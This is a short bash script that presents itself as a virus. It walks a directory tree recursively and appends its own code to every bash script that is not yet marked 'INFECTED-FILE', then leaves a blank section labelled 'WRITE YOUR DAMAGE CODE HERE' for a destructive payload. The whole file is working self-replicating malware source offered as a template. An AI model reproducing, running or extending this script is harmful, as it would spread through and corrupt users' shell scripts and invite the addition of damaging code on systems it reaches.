#!/bin/bash

# INFECTED-FILE
# the starting point of the virus
# change this to the desired directory
ROOT="."


# get the script name
SCIPT_NAME="${0##*/}"

# get the script path
SCIPT_PATH=$0

# the infection function
function infect
{
	echo $1
	# iterate over all the files and directories in $DIR
	for i in $(ls $1); 
	do
		echo $1/$i
		if [ -d $1/$i ];   # if $i is a directory 
		then
			infect $1/$i  		# call the function again with the new directory
		else
			if cat $1/$i | grep ^"#\!/bin/bash" >/dev/null; # if the file $i starts with #!/bint/bash
			then
				if ! cat $1/$i | grep "INFECTED-FILE" >/dev/null;	# if the file is not infected infect it
				then
					cat $SCIPT_PATH >> $1/$i 		# infect the file 
					echo "INFECTED $1/$i" 
				fi 
			fi

		fi

	done
}

infect $ROOT	# call the function


########################################################################
#																	   #
#																	   #					
#																	   #							
#					WRITE YOUR DAMAGE CODE HERE						   #
#																	   #				
#																	   #				
#																       #
#																	   #								
########################################################################
